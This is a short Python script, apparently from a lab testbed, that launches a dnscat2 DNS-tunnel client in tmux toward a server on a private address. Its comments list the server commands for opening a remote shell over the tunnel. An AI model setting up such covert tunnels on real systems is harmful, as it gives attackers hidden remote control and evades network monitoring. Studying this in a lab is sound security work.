import subprocess
import os 
import time
import socket

hostname = socket.gethostname()
print("Hostname:", hostname)

if hostname == 'client':

    os.chdir("/dns/client")
    # get ip address from server and run it in the server?

    session_name = "dns_session_client"
    # Start a new tmux session
    subprocess.run(f"tmux new-session -d -s {session_name}", shell=True)
    time.sleep(1)  # Wait for tmux session to initialize

    # Send the command to start dnscat2
    cmd = 'sleep 10'
    subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)

    cmd = "./dnscat --dns server=172.20.0.3,port=53 --secret=abc"
    subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)

    # time.sleep(15)

    # Attach to the tmux session
    subprocess.run(f"tmux attach -t {session_name}", shell=True)

# commands:
# dns tunneling: initiate client & server listner in tmux session
# dns server first: 
# ruby dnscat2.rb --secret=abc
# enter session server: session -i 1
# shell
# session -i 2
#  NOW ANY COMMANDS CAN BE RUN - (except possibly ssh- no psudo terminal)
# ping 172.20.0.2

# dns client command:  
# ./dnscat --dns server=172.20.0.3,port=53 --secret=abc